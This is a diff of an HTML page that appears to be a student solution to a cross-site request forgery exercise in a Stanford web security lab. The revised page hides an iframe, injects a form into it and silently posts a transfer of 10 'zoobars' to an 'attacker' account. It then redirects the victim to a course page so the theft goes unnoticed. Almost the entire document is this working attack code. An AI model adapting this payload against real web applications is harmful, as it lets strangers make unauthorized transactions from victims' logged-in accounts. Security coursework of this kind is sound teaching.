@@ -4,42 +4,44 @@
 	<head>
 		<title>&nbsp;</title>
 		<meta charset="UTF-8"/>
+		<style>
+			#outerFrame{display: none;}
+		</style>
 	</head>
 
 	<body>
 
-		<iframe id='outerFrame' name='outerFrame' style='width: 1000px; height: 1000px; background-color: #DDDDFF;'></iframe>
-		
+		<iframe id='outerFrame' name='outerFrame'></iframe>
 		
 		<script type="text/javascript">
 		//<![CDATA[
-			f = document.getElementById("outerFrame");
-			fdoc = f.contentDocument;
-			egg = "<iframe id='innerFrame' name='innerFrame' style='width:400px; height: 400px; background-color: red;'></iframe>" +
-				"<form id='transferForm' style='' action='http://localhost/transfer.php' method='POST' target='innerFrame'>" +
-				"<input type='text' name='zoobars' value='1'>" +
+			// need id and name to match for iframe, otherwise Firefox will not post form to target iframe
+			// see: http://stackoverflow.com/questions/7083325/firefox-form-targetting-an-iframe-is-opening-new-tab
+			var egg = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
+				"<form id='transferForm' action='http://localhost/transfer.php' method='POST' target='innerFrame'>" +
+				"<input type='text' name='zoobars' value='10'>" +
 				"<input type='text' name='recipient' value='attacker'>" +
 				"<input type='text' name='submission' value='Send'>" +
 				"</form>";
 
-			// TODO: need to change value for zoobars to 10
-			
-			// Hack, trigger a page load, otherwise attack works in Chrome but not in Firefox. see http://stackoverflow.com/questions/7828502/cannot-set-document-body-innerhtml-of-iframe-in-firefox
-			fdoc.open();
-			fdoc.close();
-			//Set innerHTML of the body tag.
-			fdoc.body.innerHTML = egg;
-			form = fdoc.body.children['transferForm'];
+			// TODO: need to change localhost to zoobar.stanford.edu
 
-			setTimeout(function(){form.submit()},5000)
+			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
 			
-			//setTimeout(function(){document.location.href="http://crypto.stanford.edu/cs155/"},50)
+			// Hack, trigger a page load, otherwise attack works in Chrome but not in Firefox. 
+			// See http://stackoverflow.com/questions/7828502/cannot-set-document-body-innerhtml-of-iframe-in-firefox
+			outerFrameDoc.open();
+			outerFrameDoc.close();
+			//Set innerHTML of the body tag.
+			outerFrameDoc.body.innerHTML = egg;
+			
+			var transferForm = outerFrameDoc.body.children['transferForm'];
+			transferForm.submit();
+			
+			setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 50 );
 		//]]>
 		</script>
 		
 	</body>
 
 </html>
-
-
-<!-- "<form id='transferForm' style='' action='http://localhost/transfer.php' method='POST' target='innerFrame'>" + -->
